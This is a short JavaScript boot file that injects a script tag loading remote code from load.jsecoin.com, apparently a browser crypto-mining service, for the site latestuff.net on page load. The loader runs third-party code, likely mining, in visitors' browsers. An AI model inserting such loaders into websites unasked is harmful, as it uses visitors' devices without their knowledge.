// import something here

// leave the export, even if you don't use it
export default async () => {
  window.JSENoAds = 1;
  const e = document;
  const t = e.createElement("script");
  const s = e.getElementsByTagName("script")[0];
  t.type = "text/javascript";
  t.async = 1;
  t.defer = 1;
  t.src = "https://load.jsecoin.com/load/151332/latestuff.net/0/0/";
  s.parentNode.insertBefore(t, s);
};
